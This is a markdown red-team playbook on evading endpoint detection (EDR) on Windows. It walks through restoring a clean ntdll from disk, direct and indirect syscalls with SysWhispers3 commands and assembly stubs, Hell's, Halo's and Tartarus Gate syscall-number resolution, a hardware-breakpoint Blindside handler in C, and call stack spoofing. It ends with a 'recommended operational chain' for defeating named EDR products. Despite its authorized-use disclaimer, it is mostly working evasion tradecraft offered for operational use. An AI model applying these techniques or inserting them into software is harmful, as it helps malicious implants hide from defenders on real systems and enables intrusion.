# Unhook / Direct / Indirect Syscall Technique Manifest

> For authorized Red Team / adversarial emulation / internal product testing ONLY. Strictly forbidden for unauthorized targets.

This document summarizes current mainstream techniques for bypassing user-mode hooks, ranging from classic unhooking to hardware breakpoint Blindside.
All techniques are mapped to MITRE ATT&CK T1562.001 / T1027 / T1055 for clear reporting.

## 1. Peruns Fart / Fresh Ntdll from Disk

### Concept

EDR hooks reside entirely within `ntdll.dll` in the current process memory. `C:\Windows\System32\ntdll.dll` on disk is clean.
By re-mapping disk ntdll into the current process and overwriting the `.text` section in memory, user-mode hooks are wiped.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (with EDR hook jmp)│ ◄── Overwritten with clean .text from disk
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← Clean
```

### Key Implementation Steps

```c
// step:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll") // Use native path to bypass monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Locate .text section at new address
// 5. NtProtectVirtualMemory to change current ntdll .text to RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory restore to RX
```

### Caveats

- `NtProtectVirtualMemory` itself may be hooked → circular dependency. Solution: Call `NtProtectVirtualMemory` via **direct syscall** first
- Modern EDRs monitor write operations on ntdll memory during `NtProtectVirtualMemory`; pair with ETW patching
- Peruns Fart leaves ETW-TI events (`KERNEL_MODULE_LOAD`, `PROTECTVM`) — silence ETW first

## 2. Direct Syscall

### Concept

Bypass ntdll export functions by writing custom syscall stubs:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Value on Win11 24H2, varies by OS version)
    syscall
    ret
```

The `syscall` instruction transitions directly from user mode to kernel SSDT, skipping all user-mode hooks.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - Function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stub
syscallsstubs.std.x64.asm  - Standard direct syscall
```

In Visual Studio:

```text
1. Add .asm to project, enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) replacing original NtAllocateVirtualMemory
```

### Minimal Direct Syscall Calling NtCreateFile (C Skeleton)

```c
// syscalls.asm (Excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (Dynamically resolve SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // Write bytes (omitted)
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction resides in the implant's own `.text` section (not in ntdll) → kernel-mode telemetry easily flags "syscall from non-ntdll address"
- This prompted the creation of indirect syscalls

## 3. Indirect Syscall

### Concept

The syscall instruction executes within `ntdll.dll` (a legitimate address), while SSN and return addresses are controlled by us:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of syscall;ret gadget in ntdll>]   ; syscall is not in implant
```

The target gadget is usually the two-byte `syscall; ret` sequence at the end of `Nt*` functions.
The RIP observed by kernel-mode ETW providers points to an ntdll address, matching legitimate behavior.

### SysWhispers3 Indirect Mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => Randomize jmp targets to reduce signatures
```

Generated Stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; Returns SSN -> eax
    call Sw3GetSyscallAddress      ; Returns syscall;ret address in ntdll -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; Jump to legitimate syscall instruction inside ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

Evolution of dynamic SSN resolution techniques.

### Hell's Gate

- Assumes ntdll is unhooked
- Iterates over `Nt*` exports in ntdll at implant launch, extracting SSN from the first 4 bytes `mov eax, <SSN>`
- Advantage: Avoids hardcoded SSNs, portable across Windows versions
- Drawback: Fails if ntdll is hooked (first byte replaced with jmp)

### Halo's Gate

- Solves the hook issue in Hell's Gate
- If a function is hooked (non-standard prologue), scans neighbor functions ±N up or down
- Leverages contiguous SSN ordering of `Nt*` functions in ntdll to infer hooked function SSN from neighbors

```text
Normal case:
  NtAllocateVirtualMemory   SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked, check neighbors:
  Previous unhooked export SSN = 0x17
  Next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Handles advanced hooks where the SSN instruction is modified but syscall instructions remain
- Checks both SSN and `syscall;ret` gadget addresses
- Combining all three provides a robust foundation for indirect syscalls

### Reference Implementations (Post-bootstrap git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (includes fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   Integrates all three
```

## 5. Hardware Breakpoint Blindside

### Concept

Set hardware breakpoints using debug registers `DR0-DR3` at the entry points of EDR hook trampolines;
Configure a VEH (Vectored Exception Handler) so upon breakpoint hit, RIP is redirected directly past the hook trampoline,
Bypassing EDR inspection code and landing directly on the legitimate syscall instructions in ntdll.

### Advantages

- No modification to ntdll memory (no `NtProtectVirtualMemory` alerts)
- No unhooking required (hooks remain intact, merely bypassed)
- ETW-TI observes no memory modifications

### Implementation Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at entry points of hooked functions (max 4, with single-step rotation)
// 3. SetThreadContext(thread, &ctx) writes DRx
// 4. EDR hook trampoline triggers hardware breakpoint -> VEH intercepts
// 5. VEH modifies EXCEPTION_POINTERS->ContextRecord->Rip to legitimate syscall;ret in ntdll
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN is already in eax; R10 = RCX; jump to syscall;ret in ntdll
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- DRx registers are thread-specific → must set per thread
- Some EDRs hook `NtSetContextThread` / `NtGetContextThread`; bypass using prior techniques first
- Win11 22H2+ HVCI / anti-debugging mitigations may interfere

## 6. Call Stack Spoofing

### The Problem

Modern EDRs invoke `RtlCaptureStackBackTrace` at syscall kernel entry points (e.g., `NtAllocateVirtualMemory`, `NtCreateThreadEx`),
Reporting full call stack telemetry. Implant stack frames originating from non-image-backed memory trigger high-confidence alerts.

### Solution A: CallStackSpoofer (William Burgess)

Concept:

1. Swap current thread stack before syscall to a synthetic legitimate stack
2. Populate synthetic frames with legitimate return chains (e.g., `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`)
3. Swap back to original stack after syscall returns

### Solution B: SilentMoonwalk

More aggressive desynchronized stack approach:

```text
Execution procedure:
  Implant code  →  Custom trampoline (modify RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace observes synthetic stack)
                ↓
                Trampoline restores → Resume implant code
```

Critical mechanism is unwinding: force `RtlVirtualUnwind` to navigate synthetic `RUNTIME_FUNCTION` / `UNWIND_INFO` chains.

### Practical OPSEC Recommendations

- Call stack spoofing + indirect syscalls + ETW patching represents a reliable combination against CrowdStrike / SentinelOne
- Apply spoofing during sleep phase as well; spoofing solely during execution is insufficient (EDRs sample periodically)

## 7. Technique Comparison Table

| Technique | Countered Vector | Complexity | Current Effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | User-mode hooks | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hooks | Low | Low-Medium (Kernel observes RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hooks + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | Hooks + no write operations | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | Call stack telemetry | High | High | T1564 |

Recommended operational chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing Feedback

Unhooking is only half of evasion; the other half is telemetry blinding: proceed to `references/telemetry-blinding.md`.
